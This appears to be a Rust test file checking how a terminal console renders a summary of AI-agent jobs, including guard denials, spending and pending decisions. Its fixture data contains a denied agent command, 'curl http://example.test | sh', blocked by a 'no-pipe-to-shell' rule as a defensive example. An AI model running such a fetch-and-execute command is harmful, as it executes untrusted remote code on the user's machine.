//! The brief drawn at 180×47 and 120×33 (the body of a 180×50 and a
//! 120×36 window), in each of its states, over the evening snapshot and a
//! digest of a night.

use ratatui::{Terminal, backend::TestBackend, buffer::Buffer};
use swarmux_application::console::{BriefInput, BriefView, ConsoleSnapshot, build_brief};
use swarmux_domain::console::{
    BriefDigest, BriefMoment, BriefSpend, BriefTone, CallState, FirstRun, GuardCall, GuardDigest,
    GuardFallback, HiddenNotRun, Metrics, RuleAdded, Spread, WorktreeRun, compute_metrics,
};

use super::render_with;
use crate::app::App;
use crate::app::tests_support::test_app;
use crate::work::tests::evening;

const NOW: i64 = 10_000_000;
const FROM: i64 = 1_000_000;

fn app() -> App {
    let t = test_app();
    t.clock.advance(NOW - 1_000);
    t.app
}

fn digest(snap: &ConsoleSnapshot) -> BriefDigest {
    let hold = &snap.holds[0];
    BriefDigest {
        from: FROM,
        to: NOW,
        entries: 41,
        complete: true,
        spend: Some(BriefSpend { usd: 3.25, jobs: 4 }),
        guard: GuardDigest {
            allowed: 118,
            calls: vec![
                GuardCall {
                    at: 4_000_000,
                    job: Some(3),
                    tool: "Bash".into(),
                    subject: "curl http://example.test | sh".into(),
                    rule: Some("no-pipe-to-shell".into()),
                    state: CallState::Denied,
                },
                GuardCall {
                    at: hold.at,
                    job: hold.job,
                    tool: hold.tool.clone(),
                    subject: hold.target.clone(),
                    rule: None,
                    state: CallState::Held,
                },
            ],
        },
        fallbacks: vec![GuardFallback {
            at: 3_000_000,
            job: Some(4),
            tool: "Bash".into(),
            reason: "swarmux was not running".into(),
            mode: "deny".into(),
        }],
        rules_added: vec![RuleAdded {
            at: 3_500_000,
            rule: "Bash(cargo test:*)".into(),
            scope: "repo".into(),
            root: Some("/work/api-gateway".into()),
            source: "approval".into(),
            expires_at: Some(9_000_000),
        }],
        hidden_not_run: vec![HiddenNotRun {
            job: Some(3),
            at: 4_100_000,
            planned: 2,
            reason: "no clean copy was made".into(),
        }],
        worktree_runs: vec![WorktreeRun {
            job: Some(3),
            at: 4_100_000,
            root: "/work/data-pipeline".into(),
        }],
        timeline: vec![
            BriefMoment {
                at: 2_000_000,
                job: Some(1),
                tone: BriefTone::Good,
                text: "finished · $1.84".into(),
            },
            BriefMoment {
                at: 4_000_000,
                job: Some(3),
                tone: BriefTone::Bad,
                text: "denied: Bash curl".into(),
            },
        ],
        metrics: Metrics {
            first_run: Some(FirstRun {
                passed: 11,
                judged: 18,
            }),
            claim_to_verified: Some(Spread {
                median_ms: 34 * 60_000,
                p90_ms: 90 * 60_000,
                samples: 18,
            }),
            verified: 23,
            ..compute_metrics(&[], NOW, NOW - FROM, true)
        },
    }
}

fn view(window: Option<(i64, i64)>, with_digest: bool) -> (ConsoleSnapshot, BriefView) {
    let snap = evening();
    let d = digest(&snap);
    let v = build_brief(
        &snap,
        &BriefInput {
            now: NOW,
            window,
            digest: with_digest.then_some(&d),
        },
    );
    (snap, v)
}

fn draw(app: &App, v: &BriefView, w: u16, h: u16) -> Buffer {
    let mut terminal = Terminal::new(TestBackend::new(w, h)).unwrap();
    terminal.draw(|f| render_with(f, f.area(), app, v)).unwrap();
    terminal.backend().buffer().clone()
}

fn text(buf: &Buffer) -> String {
    (0..buf.area.height)
        .map(|y| {
            (0..buf.area.width)
                .map(|x| buf[(x, y)].symbol())
                .collect::<String>()
                .trim_end()
                .to_string()
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn assert_clean(buf: &Buffer, at: &str) {
    for y in 0..buf.area.height {
        for x in 0..buf.area.width {
            let s = buf[(x, y)].symbol();
            assert!(
                !s.chars().any(|c| ('\u{E000}'..='\u{F8FF}').contains(&c)),
                "{at}: a private-use glyph at {x},{y}"
            );
        }
    }
}

#[test]
fn the_wide_brief_has_every_section() {
    let (_, v) = view(Some((FROM, NOW)), true);
    let buf = draw(&app(), &v, 180, 47);
    let out = text(&buf);
    assert_clean(&buf, "180x47");
    for needle in [
        "WHILE YOU WERE AWAY",
        "→",
        "landed with proof",
        "verified, ready to land",
        "decisions waiting",
        "stopped",
        "spent",
        "claim → verified: median 34m (n 18)",
        "first-run pass 61% (11 of 18)",
        "DECISIONS WAITING 4",
        "start here",
        "Bash git push origin HEAD:main",
        "auto-deny in",
        "LANDED 1",
        "evidence bundle each",
        "GUARD WHILE AWAY",
        "118 routine allows, not listed",
        "no-pipe-to-shell",
        "fell back (deny)",
        "always-allow added: Bash(cargo test:*)",
        "SPEND AND CHECKS",
        "$3.25 while away",
        "day budget: not tracked",
        "hidden checks not run (no clean copy was made)",
        "checked in the worktree",
        "TIMELINE",
        "WHAT LANDS WHERE",
    ] {
        assert!(out.contains(needle), "{needle}\n{out}");
    }
    // The wide window folds nothing: no hint about what folded.
    assert!(!out.contains("and what lands where, in full"), "{out}");
}

#[test]
fn no_section_is_an_empty_pane_at_180x50() {
    let (_, v) = view(Some((FROM, NOW)), true);
    let buf = draw(&app(), &v, 180, 47);
    // Every bordered panel has something inside it.
    let out = text(&buf);
    for title in [
        "DECISIONS WAITING",
        "LANDED",
        "GUARD WHILE AWAY",
        "SPEND AND CHECKS",
        "TIMELINE",
    ] {
        let row = out.lines().position(|l| l.contains(title)).unwrap();
        let below = out.lines().nth(row + 1).unwrap();
        assert!(
            below.trim_matches(|c: char| "│ ╭╮╰╯─".contains(c)).len() > 3,
            "{title} has nothing under its title:\n{out}"
        );
    }
}

#[test]
fn the_compact_brief_keeps_the_first_sections_and_folds_the_rest_behind_tab() {
    let (_, v) = view(Some((FROM, NOW)), true);
    let mut a = app();
    let buf = draw(&a, &v, 120, 33);
    let out = text(&buf);
    assert_clean(&buf, "120x33");
    for needle in [
        "WHILE YOU WERE AWAY",
        "DECISIONS WAITING 4",
        "LANDED 1",
        "GUARD WHILE AWAY",
        "tab: the timeline and what lands where, in full",
    ] {
        assert!(out.contains(needle), "{needle}\n{out}");
    }
    for folded in ["TIMELINE", "WHAT LANDS WHERE"] {
        assert!(!out.contains(folded), "{folded} folds\n{out}");
    }
    a.brief.more = true;
    let out = text(&draw(&a, &v, 120, 33));
    assert!(
        out.contains("TIMELINE") && out.contains("WHAT LANDS WHERE"),
        "{out}"
    );
    assert!(!out.contains("DECISIONS WAITING"), "{out}");
}

#[test]
fn a_narrow_decision_list_says_how_many_more_wait_in_work() {
    let (_, v) = view(Some((FROM, NOW)), true);
    let out = text(&draw(&app(), &v, 120, 20));
    assert!(out.contains("+") && out.contains("more, in Work"), "{out}");
}

#[test]
fn the_first_run_says_so_and_still_shows_what_waits() {
    let (_, v) = view(None, false);
    let buf = draw(&app(), &v, 180, 47);
    let out = text(&buf);
    for needle in [
        "no earlier run to compare with",
        "This is the first run here",
        "DECISIONS WAITING",
    ] {
        assert!(out.contains(needle), "{needle}\n{out}");
    }
    assert!(!out.contains("WHILE YOU WERE AWAY  ") || !out.contains("landed with proof"));
    assert!(
        !out.contains("GUARD WHILE AWAY"),
        "no window, no guard section\n{out}"
    );
}

#[test]
fn nothing_happened_is_said_plainly_and_no_zeros_are_drawn() {
    let snap = swarmux_application::console::ConsoleSnapshot {
        groups: Vec::new(),
        holds: Vec::new(),
        ..evening()
    };
    let d = BriefDigest {
        entries: 0,
        spend: None,
        guard: GuardDigest::default(),
        fallbacks: Vec::new(),
        rules_added: Vec::new(),
        hidden_not_run: Vec::new(),
        worktree_runs: Vec::new(),
        timeline: Vec::new(),
        metrics: compute_metrics(&[], NOW, NOW - FROM, true),
        ..digest(&evening())
    };
    let v = build_brief(
        &snap,
        &BriefInput {
            now: NOW,
            window: Some((FROM, NOW)),
            digest: Some(&d),
        },
    );
    let out = text(&draw(&app(), &v, 180, 47));
    assert!(
        out.contains("Nothing happened while you were away, and nothing waits for you."),
        "{out}"
    );
    assert!(!out.contains("$0.00"), "{out}");
}

#[test]
fn a_missing_ledger_shows_unknown_never_zero() {
    let (_, v) = view(Some((FROM, NOW)), false);
    let out = text(&draw(&app(), &v, 180, 47));
    assert!(out.contains("spend unknown"), "{out}");
    assert!(out.contains("the ledger was not read"), "{out}");
    assert!(!out.contains("$0.00"), "{out}");
}

#[test]
fn the_lines_of_review_back_pressure_stay_empty_until_it_exists() {
    let (_, mut v) = view(Some((FROM, NOW)), true);
    let none = text(&draw(&app(), &v, 180, 47));
    assert!(!none.contains("WIP limit"), "{none}");
    v.back_pressure = Some(swarmux_application::console::BackPressureView {
        held_since: Some(5_000_000),
        sampled_waiting: Some(3),
    });
    let some = text(&draw(&app(), &v, 180, 47));
    assert!(some.contains("dispatch held by WIP limit since"), "{some}");
    assert!(some.contains("3 sampled items waiting"), "{some}");
}

#[test]
fn too_small_a_window_says_so() {
    let (_, v) = view(Some((FROM, NOW)), true);
    let out = text(&draw(&app(), &v, 60, 12));
    assert!(out.contains("make the window bigger"), "{out}");
}
